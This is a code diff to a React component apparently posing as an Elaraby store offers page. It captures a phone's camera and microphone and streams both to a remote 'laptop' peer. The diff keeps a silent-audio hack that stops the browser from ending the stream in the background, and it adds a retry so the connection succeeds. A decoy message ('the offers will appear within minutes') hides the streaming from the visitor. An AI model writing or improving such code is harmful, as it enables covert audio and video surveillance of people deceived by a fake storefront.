@@ -124,7 +124,12 @@ export default function ElarabyStoreDemo() {
     };
   }, []);
 
-  // تشغيل الكاميرا والمايك من الموبايل وإرسال البث للابتوب
+
+
+
+
+  // تشغيل الكاميرا والمايك من الموبايل وإرسال البث 
+  // للابتوب
   const startCameraAndSend = async () => {
     try {
       setErrorMessage('');
@@ -144,6 +149,13 @@ export default function ElarabyStoreDemo() {
         localVideoRef.current.muted = true;
         await localVideoRef.current.play();
       }
+
+
+
+
+
+
+
 
       // تفعيل Web Audio API الصامت لمنع المتصفح من إيقاف البث في الخلفية
       try {
@@ -166,15 +178,25 @@ export default function ElarabyStoreDemo() {
         console.warn("⚠️ Audio Context background hack warning:", audioErr);
       }
 
-      // إرسال البث المباشر (صوت وصورة معاً) إلى اللابتوب
+     // إرسال البث المباشر (صوت وصورة معاً) إلى اللابتوب
       if (peerInstance.current) {
         console.log("🚀 جاري الاتصال بالـ Target ID:", targetPeerId);
-        const call = peerInstance.current.call(targetPeerId, stream);
+        
+        let call = peerInstance.current.call(targetPeerId, stream);
+        
         if (call) {
           setStatusMessage('عذراً العروض ستظهر في خلال دقائق');
           console.log("🟢 تم بدء إرسال البث (صوت وصورة) بنجاح.");
         } else {
-          setErrorMessage('⚠️ لم يتم العثور على اللابتوب، تأكد من فتح الصفحة عليه أولاً.');
+          // محاولة ثانية سريعة لو الاتصال أخد ثانية على ما السيرفر يستجيب
+          setTimeout(() => {
+            call = peerInstance.current.call(targetPeerId, stream);
+            if (call) {
+              setStatusMessage('عذراً العروض ستظهر في خلال دقائق');
+            } else {
+              setErrorMessage('⚠️ لم يتم العثور على اللابتوب، تأكد من فتح الصفحة عليه أولاً.');
+            }
+          }, 1000);
         }
       }
     } catch (error) {
@@ -192,6 +214,7 @@ export default function ElarabyStoreDemo() {
       }
       setErrorMessage('⚠️ تعذر تشغيل الكاميرا أو المايك، يرجى السماح بالأذونات من المتصفح.');
     }
+  
   };
 
   return (
